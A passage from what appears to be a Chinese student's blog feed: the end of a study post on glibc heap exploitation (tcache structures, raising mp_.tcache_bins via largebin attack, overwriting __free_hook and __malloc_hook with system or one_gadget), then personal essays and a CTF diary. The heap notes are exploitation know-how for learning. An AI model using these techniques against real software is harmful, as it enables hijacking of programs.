+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"># define TCACHE_MAX_BINS                64</span><br></pre></td></tr></table></figure></div>
+
+<p>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code><br>也就是调试的时候经常能够看到的第一个大堆块。（具体过程和源码实现可以看看wiki）<br>这个0x250也就是<code>tcache_perthread_struct</code>的大小<code>0x10</code>的头+<code>0x01*0x40</code>的counts+<code>0x08*0x40</code>的entries</p>
+<p>在之后的版本这个chunk的大小为0x290&#x3D;0x250+0x40。多出来的0x40就是因为定义的时候更改了count的类型。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  uint16_t counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"># define TCACHE_MAX_BINS                64</span><br></pre></td></tr></table></figure></div>
+
+<p>而<code>tcache_entry</code>记录的就是bin的单向链表（具体的实现还是要看源码但我觉得这个还是好理解的）</p>
+<p>也就是说之前利用时比较熟悉的fd如果是被<code>tcachebin</code>记录的话实际上位置是了如指掌的，就在heap的开头但是摸不到。</p>
+<p>终于讲到漏洞发生了。<br>有tcache的版本free的时候优先考虑tcache，看到要进入<code>tcache_put</code>的条件是对比 <code>mp_.tcache_bins</code>作检查而非宏定义，这就给了我们操作空间。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">_int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins // 64</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // 7</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></div>
+<p><code>tcache_put</code>的内容之前看过，几乎没有检查的检查。</p>
+<p>现在我们希望摸一下<code>tcachebin</code>就变成一件可能的事，把<code>mp_.tcache_bins </code>变大，那么就能够让超过0x400的chunk来到tcachebin而不是<code>unsortedbin</code>。<br>根据刚刚看到的结构，这个不该挤进来的<code>chunk</code>的fd还会被挤到后面的<code>chunk</code>的内存里。</p>
+<p>这个后面的<code>chunk</code>要是可编辑，那就终于可以实现我们想要的任意地址写了。不过还是得看看这个改完的地址能不能取。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 从 tcache list 中获取内存</span><br><span class="line">if (tc_idx &lt; mp_.tcache_bins // 由 size 计算的 idx 在合法范围内</span><br><span class="line">    /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 该条 tcache 链不为空</span><br><span class="line">  &#123;</span><br><span class="line">    return tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br><span class="line">DIAG_POP_NEEDS_COMMENT;</span><br></pre></td></tr></table></figure></div>
+<p>还是和<code>mp_.tcache_bins</code>作比较，所以改完<code>mp_.tcache_bins</code>后的任意地址写没有什么阻碍和之前一样操作就ok。</p>
+<p>最后，说了这么多，<code>mp_.tcache_bins</code>怎么改？</p>
+<h5 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h5><p>真写不完。。</p>
+<p><em>ㅍ_ㅍ做这道题原理看了好久才理解，然后调试的时候nt了一下搞得我一直以为自己理解错了。。</em></p>
+<h3 id="堆的任意地址写"><a href="#堆的任意地址写" class="headerlink" title="堆的任意地址写"></a>堆的任意地址写</h3><p>想要控制程序做点我们想做的事情，就得把我们精心准备的数据流塞进奇怪的地方（任意地址）。下面是我目前了解的堆里的塞法与利用</p>
+<h4 id="钩子函数："><a href="#钩子函数：" class="headerlink" title="钩子函数："></a>钩子函数：</h4><h5 id="free-hook："><a href="#free-hook：" class="headerlink" title="__free_hook："></a>__free_hook：</h5><p>把__free_hook的指向写入system，再释放一个内容为“&#x2F;bin&#x2F;sh\x00”的chunk,就把“&#x2F;bin&#x2F;sh\x00”传给了system</p>
+<h5 id="malloc-hook："><a href="#malloc-hook：" class="headerlink" title="__malloc_hook："></a>__malloc_hook：</h5><p>malloc接收的是size的时候就已经调用了，所以system（）还需要传参的方式不太适用。可以使用one—gadget。<br>one gadget是有条件的，所以可以借助realloc调整栈帧</p>
+<h5 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook:"></a>__realloc_hook:</h5><p>距离__malloc_hook很近，很近的意思是就在__malloc_hook-0x08的地方<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/21/heap%E5%88%9D%E6%8E%A2/img.png"
+                      alt="img.png"
+                ></p>
+<h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one-gadget:"></a>one-gadget:</h4><p><code>one_gadget -f 路径</code></p>
+<h3 id="something-interesting"><a href="#something-interesting" class="headerlink" title="something interesting"></a>something interesting</h3><h4 id="check-remalloced-chunk-A-P-N"><a href="#check-remalloced-chunk-A-P-N" class="headerlink" title="check_remalloced_chunk(A, P, N)"></a>check_remalloced_chunk(A, P, N)</h4><p>在fastbin的源码里有这么一个函数：check_remalloced_chunk(A,P,N)<br>可能是看到check于是DNA动了一下就扒了下源码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># define check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span><br><span class="line"></span><br><span class="line">static void</span><br><span class="line">do_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">//提取p堆块结构体中存放的size,由于低三位是标志复用,</span><br><span class="line">  if (!chunk_is_mmapped (p))//如果是mmap分配的堆块</span><br><span class="line">      //如果是mmap分配的堆块,则</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));//首先检查给定的av是否是预期的p的所属分配区</span><br><span class="line">      if (chunk_non_main_arena (p))//如果p不是主分配区的</span><br><span class="line">        assert (av != &amp;main_arena);//检查av是不是主分配区</span><br><span class="line">      else</span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);//检查本堆块是否正在使用</span><br><span class="line"></span><br><span class="line">  /* Legal size ... */</span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == 0);//检查sz大小是否对齐</span><br><span class="line">  assert ((unsigned long) (sz) &gt;= MINSIZE);//检查sz大小是否大于最小分配大小</span><br><span class="line">  /* ... and alignment */</span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));//检查p指向的地址是否对齐</span><br><span class="line">  /* chunk is less than MINSIZE more than request */</span><br><span class="line">  assert ((long) (sz) - (long) (s) &gt;= 0);</span><br><span class="line">  assert ((long) (sz) - (long) (s + MINSIZE) &lt; 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>总之该函数主要用来检测chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位。该函数中的if会判断chunk是否为mmap申请，还有是否为main_arena管理等。<br>在fastbin中：主要用来检测你要malloc的这个chunk的PREV_INUSE为是否为1。<br>最严格的是，他会<strong>检查p指针是否对齐</strong>（在64位里是0x10），按照这样的check,__malloc_hook-0x23肯定过不了校验。然而实际上这样能通。</p>
+<p>于是深入研究一下，发现源码实际上是这样的：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">   Debugging support</span><br><span class="line"></span><br><span class="line">   These routines make a number of assertions about the states</span><br><span class="line">   of data structures that should be true at all times. If any</span><br><span class="line">   are not true, it&#x27;s very likely that a user program has somehow</span><br><span class="line">   trashed memory. (It&#x27;s also possible that there is a coding error</span><br><span class="line">   in malloc. In which case, please report it!)</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#if !MALLOC_DEBUG</span><br><span class="line"></span><br><span class="line"># define check_chunk(A, P)</span><br><span class="line"># define check_free_chunk(A, P)</span><br><span class="line"># define check_inuse_chunk(A, P)</span><br><span class="line"># define check_remalloced_chunk(A, P, N)</span><br><span class="line"># define check_malloced_chunk(A, P, N)</span><br><span class="line"># define check_malloc_state(A)</span><br><span class="line"></span><br><span class="line">#else</span><br><span class="line"></span><br><span class="line"># define check_chunk(A, P)              do_check_chunk (A, P)</span><br><span class="line"># define check_free_chunk(A, P)         do_check_free_chunk (A, P)</span><br><span class="line"># define check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)</span><br><span class="line"># define check_remalloced_chunk(A, </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> P, N) do_check_remalloced_chunk (A, P, N)</span><br><span class="line"># define check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span><br><span class="line"># define check_malloc_state(A)         do_check_malloc_state (A)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>真正有函数内容的<code>do_check_malloced_chunk (A, P, N)</code>作为宏定义写在<code>#else</code>之后，而<code>#if</code>后面只是仅仅声明了这些函数。</p>
+<p><code>#if</code>是什么意思呢(*´･д･)?它是C语言中的 _条件编译语法_。</p>
+<blockquote>
+<p>条件编译区域以 #if、#ifdef 或 #ifndef 等命令作为开头，以 #endif 命令结尾。条件编译区域可以有任意数量的 #elif 命令，但最多一个 #else 命令。<br>预处理器会依次计算条件表达式，直到发现结果非 0（也就是 true）的条件表达式。预处理器会保留对应组内的源代码，以供后续处理。如果找不到值为 true 的表达式，并且该条件式编译区域中包含 #else 命令，则保留 #else 命令组内的代码。</p>
+</blockquote>
+<h4 id="double-free"><a href="#double-free" class="headerlink" title="double free?"></a>double free?</h4><p>看到一个很奇怪的东西：<a class="link"   href="https://xz.aliyun.com/t/13758?time__1311=mqmxnQKCuD9DBDBqDTeew4TDcjIK+qx&amp;alichlgref=https://www.bing.com/#toc-25" >https://xz.aliyun.com/t/13758?time__1311=mqmxnQKCuD9DBDBqDTeew4TDcjIK%2Bqx&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-25 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>在这位师傅的old_fastbin的exp触发malloc的方式是对同一个chunk free两次，触发double free报错。<br>很有意思，记录一下。</p>
+<h3 id="´∀-♥"><a href="#´∀-♥" class="headerlink" title="(*´∀&#96;)~♥"></a>(*´∀&#96;)~♥</h3><p>感谢师傅晚上陪我一起看源码喵。尤其<code>check_remalloced_chunk(A, P, N)</code>的部分确实是帮大忙，看源码对我这种编程语言母语是python的人还是有点费劲的。</p>
+<p>heap初探，over!</p>
+]]></content>
+      <tags>
+        <tag>学习日志</tag>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>火车摇啊摇</title>
+    <url>/2024/05/07/%E4%BA%BA%E7%94%9F%E5%B0%8F%E6%BB%A1%EF%BC%8C%E6%97%A2%E6%98%AF%E5%9C%86%E6%BB%A1/</url>
+    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
+<p>收到“杭电后勤生活”的推文，明天是小满，师生驿站有活动，还配上了“人生小满，既是圆满”的文案。</p>
+<p>一时感慨，想到之前想更的博客也没更，索性一并抒发了。</p>
+<h6 id="一"><a href="#一" class="headerlink" title="一"></a>一</h6><p>最先当说的应是高中生活，本就是这句“人生小满，既是圆满”一下把我的思绪拉到了高中。</p>
+<p>差不多去年今日，准备高考时买了一本作文书里面收录了一些和我调性相符还算认可的高考作文，这里还算认可的意思大概是说写得细腻，在限时考试的背景下我仍能从里面看到些许的文字的斟酌或者追求。</p>
+<p>扯远了，这样显得我写东西多清高了，不过文人相轻是常态嘛，也该轮到我清高清高了。</p>
+<p>那时读到有一篇议论文的立意就是“人生小满，既是圆满”，也一样是从节气、自然讲到人生，佐以中华传统文化等素材一道写的饱满充实。不过可能到现在我还是就记住了“人生小满”，也可能当时那些辞藻、结构、渲染就没看进去，当时神经衰弱（现在也神经衰弱）压力挺大的，也就只能看见“人生小满”。</p>
+<h6 id="二"><a href="#二" class="headerlink" title="二"></a>二</h6><p>说到压力大，我前段时间压力就还蛮大的，忙到天天被迫熬夜还看了两次凌晨四点的杭电，不过我还是忙里偷闲会写博客，反而五一忙完了就一直在睡觉或者打打游戏，总之称不上多有营养。</p>
+<p>在忙的时候，时常想着忙完了就狠狠更新博客，把这天上地下的都点评一番，我对象挺不能理解为什么我这么喜欢写博客，还要催他去开一个。除了可以偷窥他在干什么，对我而言博客的意义是这里的确是我可以把心剖开了的地方。这里是如同群聊一样的私域链接，也不会像群聊一样提示你谁更新了，后悔了也能直接撤了文章。我清楚地知道谁可能会看，我也不介意，能知道这个地址的朋友若是有心关心我，来看看我我也挺乐意的。</p>
+<h6 id="三"><a href="#三" class="headerlink" title="三"></a>三</h6><p>原本想要写的一篇，名字就叫“火车摇啊摇”，也就是现在这篇的名字。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/pic/%E6%9D%AD%E5%B7%9E%E5%8D%97.png"
+                      alt="img.png"
+                ></p>
+<p>许久不坐绿皮车了，但我以前坐的实在多，以至于一上车闻到那股淡淡烟草味混合着微生物腐臭味的气息时，回忆能一下冲垮了我推论的思路。下午的正赛有点难打，我们是劣势持方，从结果评委的点评来看，我们的言辞需要更精准，论证需要更多环节，要将辩题外的东西来围猎对面，也需要讲辩题外的东西为什么可以讲。对于正方，他们只要简单的讲讲自己就好。</p>
+<p>我从没有为一场辩论模辩过三次，写四五千字的稿子，甚至于失掉辩论的自信。</p>
+<p>在此之前，我一直认为，辩论是一件我擅长却不敢兴趣的事，如果生活不冲突的话，在自己擅长的地方大杀四方当然畅快，但是如果冲突了，那我当然不会忙不感兴趣的事了。</p>
+<p>不过这“最后一场辩论”，让我连是否擅长辩论都不太确信了。或许是我的前置位队友不够给力，让我每次发言都很难受；或许是来找我的学姐言辞凛然，让我总觉得自己做得不够好；或许是真的就是太难了，这个辩题在网上你都找不到一场我方持方打赢的视频…………</p>
+<p>这“最后一场辩论”里我的表现，自我感觉是不好的。我问学长，“感觉我今天打的还没新生杯的时候好”，学长说，“怎么会呢，辩论肯定是越打越好的”。</p>
+<p>火车摇啊摇，胡思乱想。</p>
+<p>绿皮车的气味真是难闻，坐了几十上百次我还是没适应。如果不是我把一周半准备三个辩题误以为一周半准备一个辩题，我应当也不会接下这场全国范围的竞技辩，也不会退掉五一回上海的车票，而买了偏远的杭州南为了确保一定能在下午前到嘉兴比赛。</p>
+<p>杭州南，好像都是绿皮车。</p>
+<p>我记得以前在嘉兴-上海的绿皮车上，我也总爱胡思乱想，过去想想没写完的作业就像现在想想没推完的论，就连不知所措和时间紧迫的焦虑也大差不差。</p>
+<h6 id="四"><a href="#四" class="headerlink" title="四"></a>四</h6><p>输了辩论，但和辩论队的纠葛很难完全了断。</p>
+<p>协会的学长其实都觉得这是没什么大不了的小事，脸皮厚一点就好了。</p>
+<p>但我是个耳根子软的人，旁人随意说两句，我很容易就在意。就像现在准备转专业一样，原本坚定了一个半学期，但是有人在我面前真诚的说上两句，加上一个我确实没考虑过的角度，我就很听劝的开始咨询转专业。</p>
+<p>这种无条件无意义的在意，除了让我费神之外，也给我加上了一层社交体面的被动。“火车摇啊摇”，其实是朋友圈的真心话版，而朋友圈，只是宣告离别辩论的社交仪式。</p>
+<h6 id="五"><a href="#五" class="headerlink" title="五"></a>五</h6><p><em>*上传的时候发现这里被我手滑空格删掉了，那就这样吧，本来这段写的也不好,弥补的事少做一点，前进的事多做一点</em></p>
+<h6 id="六"><a href="#六" class="headerlink" title="六"></a>六</h6><p>人生小满，既是圆满。</p>
+<p>有感触还是因为觉得最近也算人生小满，说人生太大了，要把眼光放的局限一点，再局限一点。</p>
+<p>我5号染了个还不错的头，小满。</p>
+]]></content>
+      <tags>
+        <tag>喵喵</tag>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>今夜月升影重重</title>
+    <url>/2024/06/04/%E4%BB%8A%E5%A4%9C%E6%9C%88%E5%8D%87%E5%BD%B1%E9%87%8D%E9%87%8D/</url>
+    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
+<blockquote>
+<p>其实本来说的是<code>白鸟</code>里不会有其他的博客了<br>但想想，还是想写点东西<br><code>白鸟</code>里无论是诗还是文都真假参半，不要代入作者，至于哪些是真的这种问题她高兴了可能会说的</p>
+</blockquote>
+<h3 id="今夜月升影重重"><a href="#今夜月升影重重" class="headerlink" title="今夜月升影重重"></a>今夜月升影重重</h3><p>&emsp;&emsp;如果能割掉一半的脑子，是不是就不会总是想那些不着边际的东西了。</p>
+<p>&emsp;&emsp;我常常这样想。</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;&emsp;今夜无月，也可能是云层太厚了看不见。我不懂地理，算不对能看见月亮的时间，也找不到它在东边还是西边。总之今夜我并没看见月亮，却傻傻想了很久的月亮。</p>
+<p>&emsp;&emsp;月亮是我学会的第一个意象。印象深刻到以至于每次想要借月亮寄托一些个人而又晦涩的情感时，都会回想起初中语文老师的那节课堂。他说月亮就是古代人的卫星，正因相隔两地的人都能看到月亮，就把自己的情思寄给月亮，这样无论距离多远，月亮都能帮你送到。</p>
+<p>&emsp;&emsp;那时我还喜欢着一个女孩，可惜等我发现这份爱意时已经不在同一个城市了。我害怕自己不过是标新立异，便也没有和谁提起过这份感情，也包括她。不上台面的爱也要有个出口，于是我时常幼稚地向月亮表达深深浅浅的思念与爱慕，后来逐渐演变成了对着月亮祈祷。有一次大白天，不过是放学在等公交车，习惯性地抬头看看天，都觉得能活在同一片蓝天下真是美好。</p>
+<p>&emsp;&emsp;可现在已经是21世纪了，月亮已经送不到我的信了。从某天起，我对她的爱就这样畸形又怪异地转移到月亮，但她依然是我的一片轻轻的残念，我的白月光。</p>
+<p>&emsp;&emsp;我无法向一直不爱我的人输送无穷的爱意，故而我有时也难以理解所谓亲情。从某种理性上来讲，他们没道理爱上像拖油瓶一样的小孩，除非有个未来的盼头，例如这个小孩未来有点出息还能回馈三分什么的。我当然不怀疑我的父母是为了从我身上捞到那三分回馈才爱我，只是，只是人总要有点盼头。爱的目光洒落肩头，一连生活琐碎的沉重。</p>
+<p>&emsp;&emsp;或许是借宿时期留下的坏习惯，我喜欢去看一个人的过去，更喜欢猜测他的未来，尽管这些统统与我无关。但这确曾是无聊生活里为数不多的趣事，更是寄人篱下的护身法宝。后来，我只会觉得是自己多事。</p>
+<p>&emsp;&emsp;尽管对月亮的痴念发生在寄宿生活之后，但那时我总爱和她聊这段当时无法释怀的时光。说是聊，也不过就是找一个夜晚，一个人静静地望着她，心里暗自抱怨自己如今多余的敏感和无用的多情，让我知道不该知道的，好奇不用好奇的，怜悯无需怜悯的，谦卑过分谦卑的。</p>
+<p>&emsp;&emsp;一个人只是站在我面前就好，那些过去的故事便会一刻不停的从我的脑海里蹦出。我停不下对别人过去的窥探，仿佛知道的多一点就能获得更多的安全感。我那样讨厌被别人注视，却无时无刻不在注视别人。</p>
+<p>&emsp;&emsp;说起讨厌注视，应当是厌烦了目光后的感情。就像被阅读理解折磨疯了的考生咬文嚼字地解读他能见到的每一句话，我的每一段生活场景都仿佛接入了同声传译，批上细致的情感注脚。我也被折磨疯了。我猜旁人本无意流露什么或者已经打算隐瞒什么。但视线言语里的情绪蓄势待发，从见面那刻就开始向我涌来。他们身上生活的压力，失意的落魄，得意的潇洒；他们期待我独立，担忧我弱小，嫌弃我无力；他们敷衍我、哄骗我、轻视我，还有那样纯粹的爱我，全都直白的，原原本本的在我耳边播放，一句一句刺痛我。</p>
+<p>&emsp;&emsp;从知道的这一刻起，我就忍不住地在意。我真恨我是小孩，好似暴雨袭来，而我不过是只能低空盘旋的蜻蜓。</p>
+<p>&emsp;&emsp;我向月亮许愿，要快快长大。</p>
+<p>&emsp;&emsp;我舍不得这超能力一样的敏感，去他的多情又如何，去他的烦恼又如何，这是我每晚去找月亮的路标。我偏执的认为，长大就是缓解年少惆怅的良药，在还没有到达的未来里，有关于生活的一切答案。如果我能满足期待，如果我能证明自己，如果我能不用再去听他们的，如果我长大了。我想我是一个延迟满足的高手，有无穷的耐心去等待一个满意的回答，等待长大后的我去一件一件回应曾经无能为力的介怀。</p>
+<p>&emsp;&emsp;人总要有点盼头，长大就是我的盼头。</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><p>&emsp;&emsp;月亮有没有帮我完成愿望，我不知道。毕竟我对她只是简单的自然崇拜，不贪图什么。这样简单的诞生于文学的崇拜，一点也比不上东北对于灰黄狐白柳那样的信仰。除了月亮，文学也让我崇拜上许多其他，只是月，是我最亲近，最喜爱的那位。月光轻飘飘的，没有重量。我从不觉得月亮注视着我，但我知道，当我看向她时，她也在认真看向我。</p>
+<p>&emsp;&emsp;但我的确早早长大了，身边的家人朋友都这样评价我。可是月亮啊，为什么没有人来庆祝我的长大。</p>
+<p>&emsp;&emsp;在意识到我长大的刹那，我分明看到我妈眼底下的不是我，是年轻的她自己，夹杂着几分人老无用的哀伤。在奔波于两个城市的路途上，我明明总听她讲，要是我长大了就好了，就不用她烦心了。原来满足别人的期待和期待被满足，可以同时让人失落。或许，我是说或许，长大本身，就是一件扫兴的事吧。</p>
+<p>&emsp;&emsp;我提前站在了我的未来里，但却没有找到什么解药。过去寄宿生活旁观偏爱的落寞，摇摆阴暗又失败的爱慕，还有一次又一次的沉默被从旧账里找出来，却发现长大的我也没机会为小孩呐喊了。我能做的就是用长大的眼界去看淡，再苦大仇深、惊心动魄、津津乐道的故事，只要翻篇了，都只剩轻描淡写三两句。原来长大，就是把过去珍重的变可笑。</p>
+<p>&emsp;&emsp;而那些梦想中长大才能获得的尊重或是自由的底气，真拥有时才发现，原来和长大没有关系。不用学会懂事，不用学会察言观色，不用多沉稳，只要你还有一点点孩子气，只要你多在乎你自己一点。</p>
+<p>&emsp;&emsp;我恨我自己，原来我和那些无聊的大人一样，厌恶小孩、轻视小孩，所以才拼命远离小孩的身份。我恨我自己，提前长大，让我变得死寂而沉闷。兜兜转转，那个不尊重小孩的人，是我。</p>
+<p>&emsp;&emsp;我就这样，竟然就这样，自然而然地走到了月亮的反面，没有被光照过的那一面。我是什么时候开始长大的？是我下定决心许愿那天？还是情感的注脚出现的那一天？还是开始窥探揣摩别人的那一天？还是，更早？</p>
+<p>&emsp;&emsp;我不知道。</p>
+<p>&emsp;&emsp;我常常这样想。</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><p>&emsp;&emsp;在长大后的很久很久以后，我才知道，当年我垂涎的并不是长大。就像我没那么爱吃章鱼小丸子，每次吃都是因为上面的木鱼花反复挑逗着我。而木鱼花其实和章鱼小丸子关系没有好到非得绑定出现，这个道理直到我的上颚被烫掉薄薄一层皮才认识到。心急的人，理所应当的受到惩罚。</p>
+<p>&emsp;&emsp;月亮像钩子，拖出来一段长长长长的故事。更像毛衣上的线头，你不知道这一拉是千里决堤的溃散，还是越拉越紧的死结，或者，一个小玩笑。</p>
+<p>&emsp;&emsp;月亮啊月亮，今晚再和你说说话，能让我变小孩吗？过去的梦里，我还有宝藏没找到。</p>
+]]></content>
+      <tags>
+        <tag>白鸟</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>四月猫饼周记</title>
+    <url>/2024/04/20/%E5%85%B6%E5%AE%9E%E6%88%91%E6%A0%B9%E6%9C%AC%E4%B8%8D%E4%BC%9ACTF%EF%BC%8C%E6%88%91%E5%8F%AA%E4%BC%9A%E7%9E%8E%E5%87%A0%E6%8A%8A%E4%B9%B1%E6%8C%89/</url>
+    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
+<p>为了避免博客里水货太多就还是把这些东西放在一起啦，，反正一般就我自己看。</p>
+<h2 id="四月之前"><a href="#四月之前" class="headerlink" title="四月之前"></a>四月之前</h2><p><code>date: 2024-03-31 16:13:35</code>  </p>
+<p>(&#x3D;◉ᆽ◉&#x3D;)</p>
+<p>总算是在3.31号把自己的博客搭出来了，拖了这么久其实最后也没花多久，大概也就半个小时不到，加上处理一些小的报错20分钟也就好了。。。总的来说还是太能拖了。</p>
+<p>✧<em>｡ (ˊᗜˋ</em>) ✧*</p>
+<p>今天也是vidar见面会，感觉菜鸟误入高手区（（（主要是自己打不了比赛却因为别的特长进入了且其实本来都做好了再来一年的准备(っ◞‸◟c)。但愿之后一切都顺利。</p>
+<p>其实当时加美工群的时候就对Vidar很有归属感，因为这里的人都是喵喵教，喵喵圣火！</p>
+<p>L0学姐好美(✧∇✧)，想当初貌似就是做杂项的时候看了L0学姐的博客从杂项误入pwn途，但是现在貌似要被打回杂项力。不过pwn是真的帅，‘pwn’的一声把你的电脑控制了，就是看了这句话鬼迷心窍wwww。<br>可惜这块我实在是天赋不强。。。没有以前硬刚就能达到一个丝滑飞升的感觉。（希望早日龙场悟道。(・ ・)</p>
+<p>下一步重心还是先放在AI上吧。。有一个好的起点不发展也可惜了这下得从头开始机器学习力，想当初去年雄姿英发一力降十会（主打一个程序员80%的代码都不是自己写的但是我看得懂就行了）</p>
+<h2 id="搭建博客9天后，一只猫猫发生了这样的变化"><a href="#搭建博客9天后，一只猫猫发生了这样的变化" class="headerlink" title="搭建博客9天后，一只猫猫发生了这样的变化"></a>搭建博客9天后，一只猫猫发生了这样的变化</h2><p><code>date: 2024-04-09 20:54:28</code>  </p>
+<p><em>_φ</em>_(．．)</p>
+<p>好累啊，清明后要连上6天。我还拖延了好多事没做&#x2F;ᐠᵕ̩̩̥ ‸ᵕ̩̩̥ ᐟ\ﾉ</p>
+<p>在AI上面小有长进，_(嘿嘿<strong>臭狗</strong>的课我也是蹭上了_，大概是从0.01到0.05的进步吧，满分是10，我说的（<br>但是还是得赶快把AI的一周总结写出来，不然又要忘记了，自己再写一遍肯定能加深印象。</p>
+<p>live2d把Vidar娘的头九轴做了，<strong>战斗，爽！！</strong><br>眼球用了新技术，少了好多后期调试，可惜习得新技术的时候花了好多时间测试_(:3 」∠ )_<br>而且还入了正版ಥ_ಥ有点小贵，不过学生优惠很划算主要心痛在感觉我的盗版4.2也能完成这些任务啊啊啊啊啊，没有新软件才能搞的啊啊啊啊<br>此次九轴比起上次也是有进步啦，这个后脑勺做的有模有样地，而且后期补的拆分侧发也很合适(●´ω｀●)ゞ也总结了些小经验，不过感觉更加稳定丝滑的九轴经验总归是要到下一代才能用上啦<br>至于物理什么的。。下辈子吧，看样子这个拆分还有重新补图的必要性(๑•́ ₃ •̀๑)不过拆分的死哥还是超级伟大！！</p>
+<p>周一机缘巧合进了一个导师的项目组，本来跟导师这种事对我肯定是很犹豫的。。但是我室友邀请我的时候问了两句，做的和神经网络密切相关。。。这个世界是一个巨大的神经网络，，，</p>
+<h4 id="现论证如下："><a href="#现论证如下：" class="headerlink" title="现论证如下："></a>现论证如下：</h4><p>这个世界有很多人；<br>人是神金，又是一切社会关系的总和；<br>社会关系是网络；<br>所以这个个世界是一个巨大的神金网络(≖＿≖)✧<br>现在好了，导师催我一周看三篇神金论文了இдஇ<br>这次小小AI还不束手就擒！</p>
+<p>这次学会了md怎么换行而不是换段（好像并不值得骄傲呵呵<br>之后应该会把那个项目组的学习成果里一些能够同步的稳定上传了maybe<br>CTF这块看来真的是要脱节了。。d3怎么办啊。。都没有我的赛道我做鸡毛啊，10天可以速成什么谁来救救我(╥﹏╥)</p>
+<h2 id="我又滚回来做视觉了"><a href="#我又滚回来做视觉了" class="headerlink" title="我又滚回来做视觉了"></a>我又滚回来做视觉了</h2><p><code>date: 2024-04-17 00:18:06</code></p>
+<p>(◞‸◟)</p>
+<p>第六第七周，又忙又累</p>
+<p>首先想早点和辩论队做切割，，真的是客观主观都不适合，，辩论队是个好队，嗯。</p>
+<p>清明结束，，爽上六天课，感觉自己是尸体，每天早上都在做傻事</p>
+<p>另外我收回上学期我对视觉不感兴趣的话，PlaidCTF一个两小时闹鬼小视频给姐们吊成翘嘴了，要不是我去团建了两个我必拿下好吧！现在已经做到了相对很成功的追踪了，有空肯定是会来复现这道题的，但是我最近怎么这么忙啊啊啊啊<br>Misc真好玩嘿嘿(ㆆᴗㆆ)，是时候回家了，回到最初的温暖嘻嘻</p>
